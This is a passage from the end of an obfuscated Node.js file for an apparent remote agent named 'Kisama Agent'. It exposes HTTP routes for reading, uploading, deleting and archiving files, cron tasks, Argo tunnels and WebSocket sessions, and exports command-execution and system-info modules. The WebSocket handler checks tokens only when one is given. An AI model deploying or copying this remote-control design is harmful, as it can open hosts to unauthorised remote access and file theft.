                    'status': b['Qddbx'],
                    'message': r[g5(0x7df)]
                });
            }
        }), i[fT(0x155)](fT(0x852), async (m, n) => {
            const g6 = fT;
            try {
                const o = await a0Y['readFile'](m[g6(0x41a)][g6(0x2be)]);
                n[g6(0x32b)](o);
            } catch (p) {
                n[g6(0x7dc)](0x1f4)[g6(0x32b)]({
                    'status': b[g6(0x39f)],
                    'message': p[g6(0x7df)]
                });
            }
        }), i[fT(0x155)](fT(0x45c), async (m, n) => {
            const g7 = fT;
            try {
                const o = await a0Y['uploadFile'](m[g7(0x41a)][g7(0x2be)], m[g7(0x41a)][g7(0x329)], m[g7(0x41a)]['content'], m[g7(0x41a)][g7(0x39c)], m[g7(0x41a)][g7(0x464)]);
                n[g7(0x32b)](o);
            } catch (p) {
                n[g7(0x7dc)](0x1f4)[g7(0x32b)]({
                    'status': g7(0x5e7),
                    'message': p['message']
                });
            }
        }), i['post'](b[fT(0x661)], a0f['raw']({
            'type': b[fT(0x148)],
            'limit': b['WglBG']
        }), async (m, n) => {
            const g8 = fT;
            try {
                const o = decodeURIComponent(m[g8(0x254)][b[g8(0x4f2)]] || ''), p = b[g8(0x5c9)](decodeURIComponent, m['headers'][b['ficYP']] || ''), q = m[g8(0x254)][b['OQXvC']], r = m['headers'][b['mRNWi']];
                if (b[g8(0x428)](!o, !p))
                    return n[g8(0x7dc)](0x190)[g8(0x32b)]({
                        'status': b[g8(0x39f)],
                        'completed': ![],
                        'message': b[g8(0x309)]
                    });
                const s = b[g8(0x854)](q, undefined) ? b['PSNro'](parseInt, String(q), 0xa) : null, t = b[g8(0x58b)](r, undefined) ? parseInt(b[g8(0x5c9)](String, r), 0xa) : null, u = m[g8(0x41a)];
                if (!Buffer[g8(0x228)](u))
                    return n[g8(0x7dc)](0x190)[g8(0x32b)]({
                        'status': b[g8(0x39f)],
                        'completed': ![],
                        'message': g8(0x474)
                    });
                const v = await a0Y[g8(0x5dc)](o, p, u, s, t);
                n[g8(0x32b)](v);
            } catch (w) {
                n['status'](0x1f4)[g8(0x32b)]({
                    'status': b[g8(0x39f)],
                    'completed': ![],
                    'message': w[g8(0x7df)]
                });
            }
        }), i[fT(0x155)](b['rMLDx'], async (m, n) => {
            const g9 = fT;
            try {
                const o = await a0Y[g9(0x178)](m[g9(0x41a)][g9(0x2be)]);
                return n[g9(0x5ef)](b[g9(0x3df)], o[g9(0x463)][g9(0x491)]()), n[g9(0x5ef)](b[g9(0x833)], o[g9(0x2be)]), n[g9(0x5ef)](g9(0x1be), b[g9(0x148)]), n[g9(0x595)](o['content']);
            } catch (p) {
                n['status'](0x1f4)[g9(0x32b)]({
                    'status': b['Qddbx'],
                    'message': p[g9(0x7df)]
                });
            }
        }), i[fT(0x317)](fT(0x45c), async (m, n) => {
            const ga = fT;
            try {
                let o = m[ga(0x41a)][ga(0x83d)];
                if (!o || !Array['isArray'](o)) {
                    o = [];
                    if (m[ga(0x41a)]['path'])
                        o['push'](m[ga(0x41a)][ga(0x2be)]);
                    if (m[ga(0x41a)][ga(0x6ca)])
                        o[ga(0x24a)](m[ga(0x41a)]['path2']);
                }
                const p = await a0Y[ga(0x766)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n['status'](0x1f4)[ga(0x32b)]({
                    'status': b[ga(0x39f)],
                    'message': q[ga(0x7df)]
                });
            }
        }), i[fT(0x3e5)](fT(0x45c), async (m, n) => {
            const gb = fT;
            try {
                const o = await a0Y[gb(0x7e1)](m[gb(0x41a)]['move_map'] || m[gb(0x41a)]);
                n[gb(0x32b)]({
                    'status': 'ok',
                    'total': o[gb(0x650)],
                    'success': o[gb(0x3cc)](p => p[gb(0x7dc)] === 'ok')[gb(0x650)],
                    'results': o
                });
            } catch (p) {
                n['status'](0x1f4)[gb(0x32b)]({
                    'status': b[gb(0x39f)],
                    'message': p[gb(0x7df)]
                });
            }
        }), i[fT(0x155)](b[fT(0x5c1)], async (m, n) => {
            const gc = fT;
            try {
                const o = await a0Y[gc(0x843)](m[gc(0x41a)]);
                n[gc(0x32b)]({
                    'status': 'ok',
                    'total': o[gc(0x650)],
                    'success': o[gc(0x3cc)](p => p[gc(0x7dc)] === 'ok')[gc(0x650)],
                    'results': o
                });
            } catch (p) {
                n[gc(0x7dc)](0x1f4)[gc(0x32b)]({
                    'status': gc(0x5e7),
                    'message': p[gc(0x7df)]
                });
            }
        }), i[fT(0x155)](b[fT(0x6a8)], async (m, n) => {
            const gd = fT;
            try {
                const o = await a0Y['createDirectory'](m['body'][gd(0x2be)]);
                n[gd(0x32b)](o);
            } catch (p) {
                n[gd(0x7dc)](0x1f4)[gd(0x32b)]({
                    'status': b['Qddbx'],
                    'message': p[gd(0x7df)]
                });
            }
        }), i[fT(0x155)](b['ceszG'], async (m, n) => {
            const ge = fT;
            try {
                const o = m[ge(0x41a)] || {};
                if (!o[ge(0x2be)])
                    return n[ge(0x7dc)](0x190)[ge(0x32b)]({ 'error': b[ge(0x7d3)] });
                if (!Array[ge(0x677)](o[ge(0x5f8)]) || b[ge(0x466)](o[ge(0x5f8)]['length'], 0x0))
                    return n[ge(0x7dc)](0x190)[ge(0x32b)]({ 'error': b[ge(0x7e3)] });
                const p = await a0Y['zipItems'](o['path'], o[ge(0x5f8)], !!o[ge(0x331)]);
                n[ge(0x32b)](p);
            } catch (q) {
                const r = /Access denied/[ge(0x4ef)](q[ge(0x7df)]) ? 0x193 : 0x190;
                n[ge(0x7dc)](r)[ge(0x32b)]({
                    'status': b[ge(0x39f)],
                    'message': q[ge(0x7df)]
                });
            }
        }), i['post'](b[fT(0x4ff)], async (m, n) => {
            const gf = fT;
            try {
                const o = m[gf(0x41a)] || {};
                if (!o[gf(0x2be)])
                    return n[gf(0x7dc)](0x190)[gf(0x32b)]({ 'error': b[gf(0x7d3)] });
                const p = await a0Y[gf(0x220)](o[gf(0x2be)], o[gf(0x231)], o[gf(0x837)] !== ![], Array[gf(0x677)](o['entries']) ? o['entries'] : null);
                n[gf(0x32b)](p);
            } catch (q) {
                const r = /Access denied/[gf(0x4ef)](q[gf(0x7df)]) ? 0x193 : 0x190;
                n[gf(0x7dc)](r)[gf(0x32b)]({
                    'status': b[gf(0x39f)],
                    'message': q['message']
                });
            }
        }), i['get'](b['CPQln'], (m, n) => {
            const gg = fT;
            n[gg(0x32b)](a0Z[gg(0x227)]());
        }), i[fT(0x155)](b[fT(0x549)], async (m, n) => {
            const gh = fT;
            try {
                const o = await a0Z[gh(0x37b)](m['body']);
                n[gh(0x32b)](o);
            } catch (p) {
                n[gh(0x7dc)](0x1f4)[gh(0x32b)]({
                    'status': gh(0x5e7),
                    'message': p[gh(0x7df)]
                });
            }
        }), i[fT(0x225)](fT(0x457), (m, n) => {
            const gi = fT;
            n[gi(0x32b)](a0Z['getCronTasks']());
        }), i['post'](fT(0x457), (m, n) => {
            const gj = fT;
            try {
                const o = a0Z['setCronTasks'](m[gj(0x41a)]);
                n[gj(0x32b)](o);
            } catch (p) {
                n[gj(0x7dc)](0x1f4)['json']({
                    'status': gj(0x5e7),
                    'message': p[gj(0x7df)]
                });
            }
        }), i['get'](fT(0x186), (m, n) => {
            n['json'](a0Z['getTaskStatus']());
        }), i[fT(0x225)](fT(0x855), (m, n) => {
            const gk = fT;
            let o = b['HKvtL'](parseInt, m[gk(0x59b)]['limit'], 0xa) || 0x32;
            o = Math[gk(0x79f)](Math[gk(0x58e)](o, 0x1), 0x64), n[gk(0x32b)](a0Z[gk(0x37a)](o));
        }), i[fT(0x225)](fT(0x486), (m, n) => {
            const gl = fT;
            let o = b['PSNro'](parseInt, m[gl(0x59b)][gl(0x488)], 0xa) || 0x32;
            o = Math['min'](Math[gl(0x58e)](o, 0x1), 0x64), n['json'](a0Z[gl(0x393)](o));
        }), i[fT(0x317)](b['fDhpr'], (m, n) => {
            n['json'](a0Z['clearOnetimeLogs']());
        }), i['delete'](fT(0x486), (m, n) => {
            const gm = fT;
            n[gm(0x32b)](a0Z[gm(0x846)]());
        }), i[fT(0x225)](b[fT(0x1e5)], (m, n) => {
            const gn = fT;
            n[gn(0x32b)](a0Z['getLogSummary']());
        }), i['post'](b[fT(0x541)], async (m, n) => {
            const go = fT;
            try {
                const o = await a0Z[go(0x559)]();
                n[go(0x32b)](o);
            } catch (p) {
                n[go(0x7dc)](0x1f4)[go(0x32b)]({
                    'status': b[go(0x39f)],
                    'message': p[go(0x7df)]
                });
            }
        });
        const j = {
                'debug': (...m) => a0D['debug'](m[fT(0x2f9)]('\x20')),
                'info': (...m) => a0D[fT(0x4dd)](m['join']('\x20')),
                'warning': (...m) => a0D[fT(0x3d2)](m[fT(0x2f9)]('\x20'))
            }, k = new a0aL(j);
        i['get'](b[fT(0x2d3)], (m, n) => {
            const gp = fT, o = k[gp(0x288)]();
            n[gp(0x32b)]({
                'status': 'ok',
                'count': o[gp(0x650)],
                'tunnels': o
            });
        }), i[fT(0x155)](b['KkOmP'], async (m, n) => {
            const gq = fT;
            try {
                const o = b[gq(0x3c0)](a0aK, m[gq(0x41a)]);
                let p = o['port'];
                (p === undefined || p === null || p === '') && (p = a0P[gq(0x70f)]);
                const q = b[gq(0x3c0)](Number, p);
                if (!Number[gq(0x70a)](q) || b[gq(0x7fb)](q, 0x1) || b[gq(0x842)](q, 0xffff))
                    return n['status'](0x1a6)['json']({
                        'status': b[gq(0x39f)],
                        'created': ![],
                        'port': p,
                        'message': b[gq(0x4b9)]
                    });
                const r = await k[gq(0x3ab)](q, o[gq(0x1b2)] === !![]);
                n['json']({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[gq(0x4e0)],
                    'port': r[gq(0x470)],
                    'created_at': r[gq(0x71e)]
                });
            } catch (s) {
                n[gq(0x7dc)](s['status'] || 0x1f4)['json']({
                    'status': b[gq(0x39f)],
                    'created': ![],
                    'port': s['port'] ?? null,
                    'message': s[gq(0x7df)]
                });
            }
        }), i[fT(0x317)](b[fT(0x2d3)], async (m, n) => {
            const gr = fT;
            try {
                const o = b[gr(0x5c9)](a0aK, m[gr(0x41a)]), p = o[gr(0x470)], q = b[gr(0x772)](Number, p);
                if (b[gr(0x403)](p, undefined) || b[gr(0x403)](p, null) || b['omfKM'](p, '') || !Number[gr(0x70a)](q) || b[gr(0x28b)](q, 0x1) || b[gr(0x7bd)](q, 0xffff))
                    return n[gr(0x7dc)](0x1a6)['json']({
                        'status': b['Qddbx'],
                        'deleted': 0x0,
                        'port': b[gr(0x46c)](p, null),
                        'message': b['CzRQK']
                    });
                const r = await k['remove'](q, o[gr(0x3aa)]);
                if (r['status'] === 'ok')
                    return n[gr(0x32b)]({
                        'status': 'ok',
                        'deleted': r[gr(0x522)],
                        'port': q,
                        'tunnels': r[gr(0x4e2)]
                    });
                return n[gr(0x7dc)](r[gr(0x7dc)])[gr(0x32b)]({
                    'status': gr(0x5e7),
                    'deleted': 0x0,
                    'port': q,
                    'message': r['message']
                });
            } catch (s) {
                n[gr(0x7dc)](0x1f4)['json']({
                    'status': gr(0x5e7),
                    'deleted': 0x0,
                    'message': s[gr(0x7df)]
                });
            }
        }), a0D[fT(0x768)](b[fT(0x39b)]), i['ws'](fT(0x72c), async (m, n) => {
            const gs = fT, o = n[gs(0x6eb)][0x0];
            a0D[gs(0x768)](gs(0x572) + n[gs(0x33d)]), a0D[gs(0x768)](gs(0x2de) + o);
            const p = n['query'][gs(0x706)], q = n['query'][gs(0x485)], r = b[gs(0x38a)](n[gs(0x59b)][gs(0x2d1)], '1'), s = n[gs(0x59b)][gs(0x6fa)] === '1';
            a0D[gs(0x768)]('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + p);
            if (!p) {
                a0D['debug'](b[gs(0x4b3)]), m[gs(0x1e9)](0x3f0, b['FvLyS']);
                return;
            }
            if (q) {
                const u = a0P['wsDowngradeToken'](), v = Buffer[gs(0x7e4)](String(q), b[gs(0x2fb)]), w = Buffer[gs(0x7e4)](u, b[gs(0x2fb)]), x = b[gs(0x451)](v['length'], w[gs(0x650)]) && a0k['timingSafeEqual'](v, w);
                if (!x) {
                    a0D[gs(0x3d2)](gs(0x767) + p + gs(0x644)), m['close'](0x3f0, 'Authentication\x20failed:\x20Invalid\x20Token');
                    return;
                }
            }
            const t = new a0aS();
            await t['startSession'](m, p, q, r, s);
        }), a0D['debug'](b['GNzCh']), a0D[fT(0x768)](b[fT(0x2dc)]);
        const l = i[fT(0x630)](a0P[fT(0x70f)], a0P[fT(0x289)], () => {
            const gt = fT;
            a0D[gt(0x768)]('🚀\x20Kisama\x20Agent\x20Node.js\x20v' + a0P[gt(0x619)] + gt(0x292) + a0P[gt(0x289)] + ':' + a0P[gt(0x70f)]), a0D['debug'](b[gt(0x6b2)]), (b['EwRaZ'](a0P[gt(0x42a)], '1') || b[gt(0x403)](a0P[gt(0x42a)], '2') && a0aM[gt(0x43e)]()) && a0aM[gt(0x318)](k);
        });
        process['on'](b[fT(0x5a1)], () => {
            const gu = fT;
            a0D['debug'](gu(0x6b9)), l[gu(0x1e9)](), process[gu(0x64c)](0x0);
        }), a0D['debug'](b['afwNR']);
    } catch (m) {
        a0D[fT(0x5e7)](b[fT(0x55d)], m), process[fT(0x64c)](0x1);
    }
}
(require[a0aW(0x545)] === module || require['main']?.[a0aW(0x329)]?.[a0aW(0x41d)](a0aW(0x883))) && a0aT()[a0aW(0x2fa)](a0D['error']);
module['exports'] = {
    'main': a0aT,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0Z,
    'ArgoTunnelManager': a0aL,
    'KModeController': a0aM,
    'ZipArchiver': a0X
};